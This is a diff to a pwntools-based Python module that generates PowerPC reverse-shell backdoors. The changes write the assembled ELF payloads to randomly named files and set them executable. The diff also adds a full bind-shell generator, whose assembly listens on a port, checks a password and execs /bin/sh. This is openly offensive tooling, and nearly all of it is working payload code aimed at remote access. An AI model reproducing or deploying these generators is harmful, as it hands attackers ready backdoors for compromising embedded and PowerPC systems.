@@ -1,5 +1,10 @@
 from pwn import *
 from . import extract_shellcode
+from colorama import Fore,Back,Style
+from . import my_package
+import string
+
+
 
 '''
 11.10 add powerpc reverse backdoor
@@ -85,27 +90,47 @@ def powerpc_backdoor(reverse_ip, reverse_port, filename = None):
 	sc
 	'''
 	shellcode = asm(shellcode%(handle_port, handle_ip_0, handle_ip_1, handle_ip_2, handle_ip_3))
-	data = make_elf(shellcode)
+	ELF_data = make_elf(shellcode)
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
-		f=open("./powerpc_backdoor","wb")
-		f.write(data)
+		filename=filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,my_package.chars)
+		f=open(filename,"wb")
+		f.write(ELF_data)
 		f.close()
-		log.success("powerpc_backdoor is ok in current path ./")
+		os.chmod(filename, 0o755)
+		log.success("{} is ok in current path ./".format(filename))
 		context.arch = 'i386'
 		context.bits = "32"
 		context.endian = "little"
 	else:
-		log.info("waiting 3s")
-		sleep(1)
-		f=open(filename,"wb")
-		f.write(data)
-		f.close()
-		log.success("{} is ok in current path ./".format(filename))
-		context.arch='i386'
-		context.bits="32"
-		context.endian="little"
+		if(os.path.exists(filename) != True):
+			log.info("waiting 3s")
+			sleep(1)
+			f=open(filename,"wb")
+			f.write(ELF_data)
+			f.close()
+			os.chmod(filename, 0o755)
+			log.success("{} generated successfully".format(filename))
+			context.arch='i386'
+			context.bits="32"
+			context.endian="little"
+		else:
+			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) ",end='')
+			choise = input()
+			if choise == "y\n" or choise == "\n":
+				log.info("waiting 3s")
+				sleep(1)
+				f=open(filename,"wb")
+				f.write(ELF_data)
+				f.close()
+				os.chmod(filename, 0o755)
+				log.success("{} generated successfully".format(filename))
+				context.arch='i386'
+				context.bits="32"
+				context.endian="little"
+			else:
+				return 
 
 
 def ppc_reverse_sl(reverse_ip, reverse_port, filename = None):
@@ -493,27 +518,47 @@ def powerpcle_backdoor(reverse_ip, reverse_port, filename=None):
 	sc
 	'''
 	shellcode = asm(shellcode % (handle_port_2,handle_port_1, handle_ip_0, handle_ip_2, handle_ip_2, handle_ip_3))
-	data = make_elf(shellcode)
+	ELF_data = make_elf(shellcode)
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
-		f=open("./powerpcle_backdoor","wb")
-		f.write(data)
+		filename=filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,my_package.chars)
+		f=open(filename,"wb")
+		f.write(ELF_data)
 		f.close()
-		log.success("powerpcle_backdoor is ok in current path ./")
+		os.chmod(filename, 0o755)
+		log.success("{} is ok in current path ./".format(filename))
 		context.arch = 'i386'
 		context.bits = "32"
 		context.endian = "little"
 	else:
-		log.info("waiting 3s")
-		sleep(1)
-		f=open(filename,"wb")
-		f.write(data)
-		f.close()
-		log.success("{} is ok in current path ./".format(filename))
-		context.arch='i386'
-		context.bits="32"
-		context.endian="little"
+		if(os.path.exists(filename) != True):
+			log.info("waiting 3s")
+			sleep(1)
+			f=open(filename,"wb")
+			f.write(ELF_data)
+			f.close()
+			os.chmod(filename, 0o755)
+			log.success("{} generated successfully".format(filename))
+			context.arch='i386'
+			context.bits="32"
+			context.endian="little"
+		else:
+			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) ",end='')
+			choise = input()
+			if choise == "y\n" or choise == "\n":
+				log.info("waiting 3s")
+				sleep(1)
+				f=open(filename,"wb")
+				f.write(ELF_data)
+				f.close()
+				os.chmod(filename, 0o755)
+				log.success("{} generated successfully".format(filename))
+				context.arch='i386'
+				context.bits="32"
+				context.endian="little"
+			else:
+				return 
 
 '''
 pwoerpc64 reverse_shell_file 
@@ -597,27 +642,47 @@ def powerpc64_backdoor(reverse_ip, reverse_port, filename=None):
 	#print(shellcode%(handle_port, handle_ip_0, handle_ip_1, handle_ip_2, handle_ip_3))
 	shellcode = asm(shellcode%(handle_port, handle_ip_0, handle_ip_1, handle_ip_2, handle_ip_3))
 	#print(shellcode)
-	data = make_elf(shellcode)
+	ELF_data = make_elf(shellcode)
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
-		f=open("./powerpc64_backdoor","wb")
-		f.write(data)
+		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,my_package.chars)
+		f=open(filename,"wb")
+		f.write(ELF_data)
 		f.close()
-		log.success("powerpc64_backdoor is ok in current path ./")
+		os.chmod(filename, 0o755)
+		log.success("{} is ok in current path ./".format(filename))
 		context.arch = 'i386'
 		context.bits = "32"
 		context.endian = "little"
 	else:
-		log.info("waiting 3s")
-		sleep(1)
-		f=open(filename,"wb")
-		f.write(data)
-		f.close()
-		log.success("{} is ok in current path ./".format(filename))
-		context.arch='i386'
-		context.bits="32"
-		context.endian="little"
+		if(os.path.exists(filename) != True):
+			log.info("waiting 3s")
+			sleep(1)
+			f=open(filename,"wb")
+			f.write(ELF_data)
+			f.close()
+			os.chmod(filename, 0o755)
+			log.success("{} generated successfully".format(filename))
+			context.arch='i386'
+			context.bits="32"
+			context.endian="little"
+		else:
+			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) ",end='')
+			choise = input()
+			if choise == "y\n" or choise == "\n":
+				log.info("waiting 3s")
+				sleep(1)
+				f=open(filename,"wb")
+				f.write(ELF_data)
+				f.close()
+				os.chmod(filename, 0o755)
+				log.success("{} generated successfully".format(filename))
+				context.arch='i386'
+				context.bits="32"
+				context.endian="little"
+			else:
+				return 
 
 
 '''
@@ -704,27 +769,47 @@ def powerpc64le_backdoor(reverse_ip, reverse_port, filename=None):
 	#shellcode = asm(shellcode%(handle_port, handle_ip_3, handle_ip_2, handle_ip_1, handle_ip_0))
 	shellcode = asm(shellcode%(handle_port_2 , handle_port_1, handle_ip_0, handle_ip_2, handle_ip_2, handle_ip_3))
 	#print(shellcode)
-	data = make_elf(shellcode)
+	ELF_data = make_elf(shellcode)
 	if(filename==None):
 		log.info("waiting 3s")
 		sleep(1)
-		f=open("./powerpc64le_backdoor","wb")
-		f.write(data)
+		filename=context.arch + "-backdoor-" + my_package.random_string_generator(4,my_package.chars)
+		f=open(filename,"wb")
+		f.write(ELF_data)
 		f.close()
-		log.success("powerpc64le_backdoor is ok in current path ./")
+		os.chmod(filename, 0o755)
+		log.success("{} is ok in current path ./".format(filename))
 		context.arch = 'i386'
 		context.bits = "32"
 		context.endian = "little"
 	else:
-		log.info("waiting 3s")
-		sleep(1)
-		f=open(filename,"wb")
-		f.write(data)
-		f.close()
-		log.success("{} is ok in current path ./".format(filename))
-		context.arch='i386'
-		context.bits="32"
-		context.endian="little"
+		if(os.path.exists(filename) != True):
+			log.info("waiting 3s")
+			sleep(1)
+			f=open(filename,"wb")
+			f.write(ELF_data)
+			f.close()
+			os.chmod(filename, 0o755)
+			log.success("{} generated successfully".format(filename))
+			context.arch='i386'
+			context.bits="32"
+			context.endian="little"
+		else:
+			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) ",end='')
+			choise = input()
+			if choise == "y\n" or choise == "\n":
+				log.info("waiting 3s")
+				sleep(1)
+				f=open(filename,"wb")
+				f.write(ELF_data)
+				f.close()
+				os.chmod(filename, 0o755)
+				log.success("{} generated successfully".format(filename))
+				context.arch='i386'
+				context.bits="32"
+				context.endian="little"
+			else:
+				return 
 
 def ppc64_reverse_sl(reverse_ip, reverse_port, filename=None):
 	context.arch = 'powerpc64'
@@ -824,3 +909,144 @@ def ppc64_reverse_sl(reverse_ip, reverse_port, filename=None):
 		context.bits="32"
 		context.endian="little"
 		return shellcode
+
+
+def powerpc_bind_shell(listen_port , passwd, filename= None):
+	context.arch = 'powerpc'
+	context.endian = 'big'
+	context.bits = '32'
+	log.success("bind port is set to "+ str(listen_port))
+	log.success("passwd is set to '%s'"%passwd )
+	#print(listen_port)
+	handle_port='0x'+enhex(p16(listen_port))
+	#print(handle_port)
+	passwd_len = hex(len(passwd))
+	passwd = "0x"+enhex(p32(int("0x"+enhex(passwd.encode()),16)).replace(b"\x00",b'')).ljust(8,"0")
+	passwd_high = passwd[:6]
+	passwd_low  = "0x"+passwd[6:10]
+	shellcode = '''
+	mr    r31,r1
+	li    r3,2
+	li    r4,1
+	li    r5,0
+	li    r0,0x146
+	sc
+	mr    r17,r3
+	xor   r9,r9,r9
+	stw   r9, 28(r31)
+	stw   r9, 32(r31)
+	stw   r9, 36(r31)
+	stw   r9, 36(r31)
+	stw   r9, 40(r31)
+	stw   r9, 44(r31)
+	stw   r9, 48(r31)
+	stw   r9, 52(r31)
+	stw   r9, 56(r31)
+	stw   r9, 4(r31)
+	stw   r9, 8(r31)
+	li    r9, 2
+	sth   r9, 28(r31)
+	li    r9, %s
+	sth   r9, 30(r31)
+	stw   r5, 32(r31)
+	addi  r4, r31, 0x1c
+	li   r5, 0x10
+	li   r0, 0x147
+	sc
+	mr   r3, r17
+	li   r4, 0x101
+	li   r0, 0x149
+	sc
+	mr   r3, r17
+	li   r4, 0
+	li   r5, 0
+	li   r0, 0x14a
+	sc
+	mr   r16, r3
+	li   r4, 0
+	li   r0, 0x3f
+	sc
+	mr   r3, r16
+	li   r4, 1
+	sc
+	mr   r3, r16
+	li   r4, 2
+	sc
+	lis  r9, 0x5061
+	ori  r9, r9, 0x7373
+	stw  r9, -20(r31)
+	lis  r9, 0x7764
+	ori  r9, r9, 0x3a20
+	stw  r9, -16(r31)
+	li   r3, 1
+	addi r4, r31 ,-20
+	li   r5, 8
+	li   r0, 4
+	sc
+	lis  r20, %s
+	ori  r20, r20, %s
+	li   r0, 3
+	li   r3, 0
+	addi r4, r31, -32
+	li   r5, %s
+	sc
+	lwz    r10, -32(r31)
+	cmpw   cr7, r10,r20
+	bne    cr7, 0x30;
+	lis    r9, 0x2f62
+	ori    r9, r9, 26990
+	stw   r9, 48(r31)
+	xor  r9, r9, r9
+	lis    r9, 0x2f73
+	ori   r9, r9, 26624
+	stw   r9, 52(r31)
+	addi  r3, r31,0x30
+	stwu  r3, 0(r31)
+	mr    r4, r31
+	xor   r5, r5, r5
+	li    r0, 0xb
+	sc
+	'''
+	shellcode = shellcode%(handle_port, passwd_high, passwd_low, passwd_len)#, passwd_low, passwd_high, passwd_len)
+	shellcode = asm(shellcode)
+	ELF_data = make_elf(shellcode)
+	if(filename==None):
+		log.info("waiting 3s")
+		sleep(1)
+		filename=context.arch + "-bind_shell-" + my_package.random_string_generator(4,my_package.chars)
+		f=open(filename,"wb")
+		f.write(ELF_data)
+		f.close()
+		os.chmod(filename, 0o755)
+		log.success("{} is ok in current path ./".format(filename))
+		context.arch = 'i386'
+		context.bits = "32"
+		context.endian = "little"
+	else:
+		if(os.path.exists(filename) != True):
+			log.info("waiting 3s")
+			sleep(1)
+			f=open(filename,"wb")
+			f.write(ELF_data)
+			f.close()
+			os.chmod(filename, 0o755)
+			log.success("{} generated successfully".format(filename))
+			context.arch='i386'
+			context.bits="32"
+			context.endian="little"
+		else:
+			print(Fore.RED+"[+]"+" be careful File existence may overwrite the file (y/n) ",end='')
+			choise = input()
+			if choise == "y\n" or choise == "\n":
+				log.info("waiting 3s")
+				sleep(1)
+				f=open(filename,"wb")
+				f.write(ELF_data)
+				f.close()
+				os.chmod(filename, 0o755)
+				log.success("{} generated successfully".format(filename))
+				context.arch='i386'
+				context.bits="32"
+				context.endian="little"
+			else:
+				return 
